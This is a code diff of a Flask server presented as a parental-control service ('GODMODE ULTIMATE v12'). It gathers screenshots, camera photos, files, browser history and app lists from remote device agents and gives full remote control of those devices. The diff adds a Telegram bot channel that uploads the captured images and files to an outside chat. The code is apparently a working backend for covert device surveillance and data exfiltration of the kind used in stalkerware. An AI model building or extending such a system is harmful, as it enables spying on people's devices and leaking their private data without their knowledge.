@@ -2,11 +2,12 @@
 # -*- coding: utf-8 -*-
 
 """
-Parental Control Service - GODMODE ULTIMATE v11.0
+Parental Control Service - GODMODE ULTIMATE v12.0
 + 6-digit PIN authentication (parent dashboard)
 + Agent PIN authentication (agents → server)
 + Session cookies + rate limiting
 + Full remote control (tap/swipe/scroll/hotkeys/launch)
++ Telegram integration: send screenshots, camera photos, files, apps list, text
 """
 
 import os
@@ -79,8 +80,8 @@ logger = logging.getLogger(__name__)
 # AUTH CONFIG — 6-digit PINs from environment
 # ============================================================
 
-PARENT_PIN = os.environ.get('PARENT_PIN', '').strip()      # e.g. "482916"
-AGENT_PIN  = os.environ.get('AGENT_PIN',  '').strip()      # e.g. "761043"
+PARENT_PIN = os.environ.get('PARENT_PIN', '').strip()
+AGENT_PIN  = os.environ.get('AGENT_PIN',  '').strip()
 
 if not PARENT_PIN:
     logger.warning("⚠️ PARENT_PIN not set — dashboard is UNPROTECTED")
@@ -94,15 +95,15 @@ elif not AGENT_PIN.isdigit() or len(AGENT_PIN) != 6:
     logger.error("❌ AGENT_PIN must be exactly 6 digits")
     AGENT_PIN = ""
 
-# Session storage — { session_token: {ip, created_at} }
-sessions = {}                 # session_token -> dict
-SESSION_TTL = 24 * 3600       # 24 hours
+# Session storage
+sessions = {}
+SESSION_TTL = 24 * 3600
 SESSION_COOKIE = "rc_session"
 
-# Login rate limiting — { ip: [timestamps] }
+# Login rate limiting
 login_attempts = defaultdict(list)
 MAX_LOGIN_ATTEMPTS = 5
-LOGIN_WINDOW = 300            # 5 minutes
+LOGIN_WINDOW = 300
 
 # ============================================================
 # FLASK APP
@@ -110,7 +111,6 @@ LOGIN_WINDOW = 300            # 5 minutes
 
 app = Flask(__name__)
 
-# Restrict CORS to your own origins
 ALLOWED_ORIGINS = [
     'https://service-ur14.onrender.com',
     'http://localhost:5001',
@@ -160,7 +160,6 @@ def add_activity(action: str, details: str, device_id: str = "unknown"):
         activities[:] = activities[-500:]
 
 def safe_filename(name: str) -> str:
-    """Prevent path traversal in filenames."""
     import re
     name = os.path.basename(name or "")
     name = re.sub(r'[^\w.\-]', '_', name)
@@ -169,18 +168,16 @@ def safe_filename(name: str) -> str:
     return name
 
 def _safe_eq(a: str, b: str) -> bool:
-    """Constant-time comparison to prevent timing attacks."""
     try:
         return hmac.compare_digest(str(a).encode(), str(b).encode())
     except Exception:
         return False
 
 # ============================================================
-# AUTH — SESSIONS
+# AUTH
 # ============================================================
 
 def _client_ip() -> str:
-    # Render proxies requests — use X-Forwarded-For when present
     xff = request.headers.get('X-Forwarded-For', '')
     if xff:
         return xff.split(',')[0].strip()
@@ -188,10 +185,7 @@ def _client_ip() -> str:
 
 def _create_session() -> str:
     token = secrets.token_urlsafe(32)
-    sessions[token] = {
-        'ip': _client_ip(),
-        'created': time.time(),
-    }
+    sessions[token] = {'ip': _client_ip(), 'created': time.time()}
     return token
 
 def _is_valid_session(token: str) -> bool:
@@ -203,14 +197,9 @@ def _is_valid_session(token: str) -> bool:
     if time.time() - s['created'] > SESSION_TTL:
         sessions.pop(token, None)
         return False
-    # Bind session to IP (loose — only reject if IP changed drastically)
-    if s.get('ip') and s['ip'] != _client_ip():
-        # Render's proxy can vary — don't hard-fail, just note it
-        pass
     return True
 
 def _check_login_rate(ip: str) -> bool:
-    """Return True if the IP is allowed to attempt a login."""
     now = time.time()
     bucket = login_attempts[ip]
     bucket[:] = [t for t in bucket if now - t < LOGIN_WINDOW]
@@ -220,24 +209,19 @@ def _record_login_attempt(ip: str):
     login_attempts[ip].append(time.time())
 
 def _server_token_from_request():
-    """Reads server token from header, query, or session cookie."""
-    # 1. Header (preferred — used by XHR)
     h = request.headers.get('X-Server-Token')
     if h:
         return h
-    # 2. Session cookie
     s = request.cookies.get(SESSION_COOKIE)
     if s:
         return s
-    # 3. Query param (fallback for <img> tags)
     return request.args.get('token', '')
 
 def require_parent_auth(f):
-    """Decorator: require a valid parent session."""
     @wraps(f)
     def wrapper(*args, **kwargs):
         if not PARENT_PIN:
-            return f(*args, **kwargs)      # dev mode
+            return f(*args, **kwargs)
         token = _server_token_from_request()
         if _is_valid_session(token):
             return f(*args, **kwargs)
@@ -245,11 +229,10 @@ def require_parent_auth(f):
     return wrapper
 
 def require_agent_auth(f):
-    """Decorator: require the agent PIN header."""
     @wraps(f)
     def wrapper(*args, **kwargs):
         if not AGENT_PIN:
-            return f(*args, **kwargs)      # dev mode
+            return f(*args, **kwargs)
         pin = (
             request.headers.get('X-Agent-Pin')
             or request.args.get('pin')
@@ -267,10 +250,11 @@ def require_agent_auth(f):
 
 rate_buckets = defaultdict(list)
 RATE_LIMITS = {
-    'default':   (120, 60),     # 120 req per 60s
-    'control':   (180, 60),     # 180 control actions per 60s
-    'screenshot':(180, 60),     # 180 screenshot uploads per 60s
-    'login':     (10, 300),     # 10 login tries per 5 min
+    'default':   (120, 60),
+    'control':   (180, 60),
+    'screenshot':(180, 60),
+    'login':     (10, 300),
+    'telegram':  (30, 60),   # Telegram sends limited to 30 per minute
 }
 
 def rate_limit(category='default'):
@@ -290,7 +274,7 @@ def rate_limit(category='default'):
     return deco
 
 # ============================================================
-# SELF-PING SYSTEM
+# SELF-PING
 # ============================================================
 
 def get_server_url():
@@ -325,18 +309,136 @@ def start_ping_system():
     logger.info(f"🔄 Self-ping started ({get_server_url()})")
 
 # ============================================================
+# TELEGRAM INTEGRATION
+# ============================================================
+
+TELEGRAM_CONFIG_FILE = DATA_DIR / "telegram.json"
+
+telegram_config = {
+    "bot_token": "",
+    "chat_id": "",
+    "enabled": False,
+}
+
+def _load_telegram_config():
+    global telegram_config
+    try:
+        if TELEGRAM_CONFIG_FILE.exists():
+            with open(TELEGRAM_CONFIG_FILE, "r", encoding="utf-8") as f:
+                saved = json.load(f)
+                telegram_config.update(saved)
+            logger.info(f"📲 Telegram config loaded (enabled={telegram_config['enabled']})")
+    except Exception as e:
+        logger.warning(f"Telegram config load failed: {e}")
+
+def _save_telegram_config():
+    try:
+        with open(TELEGRAM_CONFIG_FILE, "w", encoding="utf-8") as f:
+            json.dump(telegram_config, f, indent=2)
+    except Exception as e:
+        logger.error(f"Telegram config save failed: {e}")
+
+_load_telegram_config()
+
+def _telegram_api_url(method: str) -> str:
+    return f"https://api.telegram.org/bot{telegram_config['bot_token']}/{method}"
+
+def _telegram_send_message(text: str, parse_mode: str = "HTML") -> dict:
+    if not telegram_config.get("enabled") or not telegram_config.get("bot_token") or not telegram_config.get("chat_id"):
+        return {"success": False, "error": "Telegram not configured"}
+    try:
+        import urllib.parse
+        url = _telegram_api_url("sendMessage")
+        payload = urllib.parse.urlencode({
+            "chat_id": telegram_config["chat_id"],
+            "text": text[:4096],
+            "parse_mode": parse_mode,
+            "disable_web_page_preview": "true",
+        }).encode("utf-8")
+        req = urllib.request.Request(url, data=payload, method="POST")
+        req.add_header("Content-Type", "application/x-www-form-urlencoded")
+        with urllib.request.urlopen(req, timeout=30) as r:
+            body = json.loads(r.read().decode("utf-8"))
+            return {"success": bool(body.get("ok")), "result": body}
+    except urllib.error.HTTPError as he:
+        try:
+            err_body = he.read().decode("utf-8")
+            logger.error(f"Telegram sendMessage HTTP {he.code}: {err_body[:300]}")
+            return {"success": False, "error": f"HTTP {he.code}", "details": err_body[:300]}
+        except Exception:
+            return {"success": False, "error": f"HTTP {he.code}"}
+    except Exception as e:
+        logger.error(f"Telegram sendMessage error: {e}")
+        return {"success": False, "error": str(e)}
+
+def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "") -> dict:
+    if not telegram_config.get("enabled") or not telegram_config.get("bot_token") or not telegram_config.get("chat_id"):
+        return {"success": False, "error": "Telegram not configured"}
+    if not filepath.exists():
+        return {"success": False, "error": "File not found"}
+
+    try:
+        import mimetypes
+        boundary = "----TelegramBoundary" + secrets.token_hex(16)
+        mime = mimetypes.guess_type(str(filepath))[0] or "application/octet-stream"
+
+        parts = []
+        parts.append(f"--{boundary}\r\n".encode())
+        parts.append(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
+        parts.append(f"{telegram_config['chat_id']}\r\n".encode())
+
+        if caption:
+            parts.append(f"--{boundary}\r\n".encode())
+            parts.append(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
+            parts.append(f"{caption[:1024]}\r\n".encode())
+            parts.append(f"--{boundary}\r\n".encode())
+            parts.append(b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n')
+            parts.append(b"HTML\r\n")
+
+        parts.append(f"--{boundary}\r\n".encode())
+        parts.append(f'Content-Disposition: form-data; name="{field}"; filename="{filepath.name}"\r\n'.encode())
+        parts.append(f"Content-Type: {mime}\r\n\r\n".encode())
+        with open(filepath, "rb") as f:
+            parts.append(f.read())
+        parts.append(f"\r\n--{boundary}--\r\n".encode())
+
+        body = b"".join(parts)
+        url = _telegram_api_url(endpoint)
+        req = urllib.request.Request(url, data=body, method="POST")
+        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
+        req.add_header("Content-Length", str(len(body)))
+
+        with urllib.request.urlopen(req, timeout=120) as r:
+            resp = json.loads(r.read().decode("utf-8"))
+            return {"success": bool(resp.get("ok")), "result": resp}
+    except urllib.error.HTTPError as he:
+        try:
+            err_body = he.read().decode("utf-8")
+            logger.error(f"Telegram {endpoint} HTTP {he.code}: {err_body[:300]}")
+            return {"success": False, "error": f"HTTP {he.code}", "details": err_body[:300]}
+        except Exception:
+            return {"success": False, "error": f"HTTP {he.code}"}
+    except Exception as e:
+        logger.error(f"Telegram {endpoint} error: {e}")
+        return {"success": False, "error": str(e)}
+
+def _telegram_send_photo(filepath: Path, caption: str = "") -> dict:
+    return _telegram_upload("sendPhoto", "photo", filepath, caption)
+
+def _telegram_send_document(filepath: Path, caption: str = "") -> dict:
+    return _telegram_upload("sendDocument", "document", filepath, caption)
+
+# ============================================================
 # AUTH ENDPOINTS
 # ============================================================
 
 @app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
 @rate_limit('login')
 def auth_login():
-    """Validate the 6-digit parent PIN and issue a session cookie."""
     if request.method == 'OPTIONS':
         return '', 204
 
     if not PARENT_PIN:
-        # Dev mode
         token = _create_session()
         resp = make_response(jsonify({'success': True, 'dev_mode': True}))
         resp.set_cookie(SESSION_COOKIE, token, httponly=True, samesite='Lax', max_age=SESSION_TTL)
@@ -344,7 +446,6 @@ def auth_login():
 
     ip = _client_ip()
     if not _check_login_rate(ip):
-        logger.warning(f"🚫 Login rate limit hit for {ip}")
         return jsonify({
             'success': False,
             'error': 'too many attempts — try again later',
@@ -363,7 +464,6 @@ def auth_login():
         logger.warning(f"🚫 Wrong PIN from {ip}")
         return jsonify({'success': False, 'error': 'incorrect PIN'}), 401
 
-    # Success
     token = _create_session()
     logger.info(f"✅ Login success from {ip}")
     add_activity('login', f'Parent login from {ip}')
@@ -385,7 +485,6 @@ def auth_logout():
 
 @app.route('/api/auth/verify', methods=['GET'])
 def auth_verify():
-    """Check whether the current cookie/header is valid."""
     if not PARENT_PIN:
         return jsonify({'success': True, 'valid': True, 'dev_mode': True})
     token = _server_token_from_request()
@@ -395,7 +494,6 @@ def auth_verify():
 
 @app.route('/api/auth/status', methods=['GET'])
 def auth_status():
-    """Public: tells the UI whether a PIN is required."""
     return jsonify({
         'success': True,
         'requires_pin': bool(PARENT_PIN),
@@ -403,7 +501,7 @@ def auth_status():
     })
 
 # ============================================================
-# SERVE WEB INTERFACE (public — gate is in JS)
+# SERVE WEB UI
 # ============================================================
 
 @app.route('/')
@@ -429,12 +527,12 @@ def serve_static(path):
 
 def get_fallback_html():
     return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-    <h1>🛡️ Parental Control v11.0</h1>
+    <h1>🛡️ Parental Control v12.0</h1>
     <p>index.html not found. Please upload it to web/public/</p>
     </body></html>'''
 
 # ============================================================
-# HEALTH (public — used by self-ping)
+# HEALTH
 # ============================================================
 
 @app.route('/api/health', methods=['GET'])
@@ -445,18 +543,19 @@ def health_check():
         "success": True,
         "service": "Parental Control API",
         "status": "running",
-        "version": "11.0.0",
+        "version": "12.0.0",
         "platform": platform.system(),
         "devices": len(devices),
         "online_agents": online_agents,
         "is_render": IS_RENDER,
         "requires_pin": bool(PARENT_PIN),
+        "telegram_enabled": telegram_config.get("enabled", False),
         "self_ping": ping_running,
         "timestamp": datetime.now().isoformat()
     })
 
 # ============================================================
-# STATUS & DEVICES (parent-auth required)
+# STATUS & DEVICES
 # ============================================================
 
 @app.route('/api/status', methods=['GET'])
@@ -506,13 +605,14 @@ def get_devices():
     return jsonify({"success": True, "devices": enriched})
 
 # ============================================================
-# SCREENSHOTS (parent-auth required)
+# SCREENSHOTS
 # ============================================================
 
 @app.route('/api/screenshots', methods=['GET'])
 @require_parent_auth
 def list_screenshots():
     limit = request.args.get('limit', 50, type=int)
+    device_id = request.args.get('deviceId', '')
     all_shots = []
     for directory in [SCREENSHOT_DIR, UPLOAD_DIR]:
         for pattern in ('*.png', '*.jpg'):
@@ -532,7 +632,6 @@ def list_screenshots():
 
 @app.route('/api/screenshots/<filename>', methods=['GET'])
 def get_screenshot(filename):
-    """Public path? No — accepts EITHER parent cookie OR ?token=... (for <img>)."""
     if PARENT_PIN:
         token = _server_token_from_request()
         if not _is_valid_session(token):
@@ -546,7 +645,7 @@ def get_screenshot(filename):
     return jsonify({"error": "File not found"}), 404
 
 # ============================================================
-# CAMERA (parent-auth required)
+# CAMERA
 # ============================================================
 
 @app.route('/api/camera/photos', methods=['GET'])
@@ -583,7 +682,7 @@ def get_camera_photo(filename):
     return jsonify({"error": "File not found"}), 404
 
 # ============================================================
-# FILES / ACTIVITY / APPS (parent-auth required)
+# FILES / ACTIVITY / APPS
 # ============================================================
 
 @app.route('/api/files/list', methods=['GET'])
@@ -687,11 +786,6 @@ def get_browser():
     limit = request.args.get('limit', 50, type=int)
     return jsonify(browser_history[-limit:])
 
-@app.route('/api/telegram/status', methods=['GET'])
-@require_parent_auth
-def telegram_status():
-    return jsonify({"success": True, "enabled": False})
-
 @app.route('/api/start', methods=['POST'])
 @require_parent_auth
 def start_monitoring():
@@ -728,7 +822,7 @@ def ping_status():
     })
 
 # ============================================================
-# AGENT MONITORING ENDPOINTS (agent-PIN required)
+# AGENT MONITORING ENDPOINTS
 # ============================================================
 
 @app.route('/api/monitor/user', methods=['POST'])
@@ -951,12 +1045,6 @@ def control_result():
         add_activity('control', f'Remote action {cid[:8]} → {"✅" if ok else "❌"}', data.get('deviceId', 'unknown'))
     return jsonify({'success': True})
 
-# --- Parent-side control endpoints ---
-
-def _parent_control(f):
-    """Compose parent auth + control rate limit."""
-    return rate_limit('control')(require_parent_auth(f))
-
 @app.route('/api/control/tap', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -1101,6 +1189,141 @@ def control_devices_list():
     return jsonify({'success': True, 'devices': online})
 
 # ============================================================
+# TELEGRAM ENDPOINTS
+# ============================================================
+
+@app.route('/api/telegram/status', methods=['GET'])
+@require_parent_auth
+def telegram_status():
+    return jsonify({
+        "success": True,
+        "enabled": telegram_config.get("enabled", False),
+        "configured": bool(telegram_config.get("bot_token") and telegram_config.get("chat_id")),
+    })
+
+@app.route('/api/telegram/config', methods=['GET', 'POST'])
+@require_parent_auth
+def telegram_config_endpoint():
+    global telegram_config
+    if request.method == 'GET':
+        return jsonify({
+            'success': True,
+            'config': {
+                'bot_token': telegram_config.get('bot_token', ''),
+                'chat_id':   telegram_config.get('chat_id', ''),
+                'enabled':   telegram_config.get('enabled', False),
+            }
+        })
+    data = request.json or {}
+    if 'bot_token' in data:
+        telegram_config['bot_token'] = str(data['bot_token']).strip()
+    if 'chat_id' in data:
+        telegram_config['chat_id'] = str(data['chat_id']).strip()
+    if 'enabled' in data:
+        telegram_config['enabled'] = bool(data['enabled'])
+    _save_telegram_config()
+    logger.info(f"📲 Telegram config updated (enabled={telegram_config['enabled']})")
+    return jsonify({'success': True})
+
+@app.route('/api/telegram/test', methods=['POST'])
+@require_parent_auth
+@rate_limit('telegram')
+def telegram_test():
+    r = _telegram_send_message(
+        "🛡️ <b>Parental Control</b>\n\n"
+        "✅ Telegram integration is connected.\n"
+        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    return jsonify(r)
+
+@app.route('/api/telegram/send-screenshot/<filename>', methods=['POST'])
+@require_parent_auth
+@rate_limit('telegram')
+def telegram_send_screenshot(filename):
+    filename = safe_filename(filename)
+    for directory in [UPLOAD_DIR, SCREENSHOT_DIR]:
+        filepath = directory / filename
+        if filepath.exists():
+            device_id = request.args.get('deviceId', '')
+            caption = "📸 <b>Screenshot</b>"
+            if device_id:
+                caption += f"\n📱 Device: <code>{device_id[:12]}</code>"
+            caption += f"\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            r = _telegram_send_photo(filepath, caption)
+            add_activity('telegram', f'Sent screenshot {filename}', device_id)
+            return jsonify(r)
+    return jsonify({'success': False, 'error': 'File not found'}), 404
+
+@app.route('/api/telegram/send-camera/<filename>', methods=['POST'])
+@require_parent_auth
+@rate_limit('telegram')
+def telegram_send_camera(filename):
+    filename = safe_filename(filename)
+    for directory in [UPLOAD_DIR, CAMERA_DIR]:
+        filepath = directory / filename
+        if filepath.exists():
+            caption = f"📷 <b>Camera Photo</b>\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            r = _telegram_send_photo(filepath, caption)
+            add_activity('telegram', f'Sent camera photo {filename}')
+            return jsonify(r)
+    return jsonify({'success': False, 'error': 'File not found'}), 404
+
+@app.route('/api/telegram/send-file/<filename>', methods=['POST'])
+@require_parent_auth
+@rate_limit('telegram')
+def telegram_send_file(filename):
+    filename = safe_filename(filename)
+    for directory in [UPLOAD_DIR, FILES_DIR]:
+        filepath = directory / filename
+        if filepath.exists():
+            caption = f"📎 <b>File</b>: {filename}\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            r = _telegram_send_document(filepath, caption)
+            add_activity('telegram', f'Sent file {filename}')
+            return jsonify(r)
+    return jsonify({'success': False, 'error': 'File not found'}), 404
+
+@app.route('/api/telegram/send-apps', methods=['POST'])
+@require_parent_auth
+@rate_limit('telegram')
+def telegram_send_apps():
+    data = request.json or {}
+    device_id = data.get('deviceId', '')
+    apps = installed_apps.get(device_id, [])
+    if not apps:
+        for a in installed_apps.values():
+            apps = a
+            break
+    if not apps:
+        return jsonify({'success': False, 'error': 'No apps reported'})
+
+    lines = [f"📱 <b>Installed Apps</b> ({len(apps)})"]
+    if device_id:
+        lines.append(f"Device: <code>{device_id[:12]}</code>")
+    lines.append("")
+    for a in apps[:80]:
+        label = (a.get('label') or a.get('name') or 'Unknown')[:50]
+        lines.append(f"• {label}")
+    if len(apps) > 80:
+        lines.append(f"… and {len(apps) - 80} more")
+
+    text = "\n".join(lines)
+    r = _telegram_send_message(text)
+    add_activity('telegram', f'Sent apps list ({len(apps)})', device_id)
+    return jsonify(r)
+
+@app.route('/api/telegram/send-text', methods=['POST'])
+@require_parent_auth
+@rate_limit('telegram')
+def telegram_send_text():
+    data = request.json or {}
+    text = str(data.get('text', '')).strip()
+    if not text:
+        return jsonify({'success': False, 'error': 'No text'}), 400
+    r = _telegram_send_message(text)
+    add_activity('telegram', f'Sent text ({len(text)} chars)')
+    return jsonify(r)
+
+# ============================================================
 # ERROR HANDLERS
 # ============================================================
 
@@ -1119,12 +1342,13 @@ def handle_exception(e):
 
 def main():
     print("=" * 70)
-    print("  PARENTAL CONTROL v11.0 - PIN-PROTECTED")
+    print("  PARENTAL CONTROL v12.0 - PIN + TELEGRAM")
     print("=" * 70)
     logger.info(f"Web dir: {WEB_DIR}")
     logger.info(f"Running on Render: {IS_RENDER}")
     logger.info(f"Parent PIN: {'SET' if PARENT_PIN else 'NOT SET (unprotected)'}")
     logger.info(f"Agent PIN:  {'SET' if AGENT_PIN else 'NOT SET (unprotected)'}")
+    logger.info(f"Telegram:   {'ENABLED' if telegram_config.get('enabled') else 'disabled'}")
 
     start_ping_system()
     app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
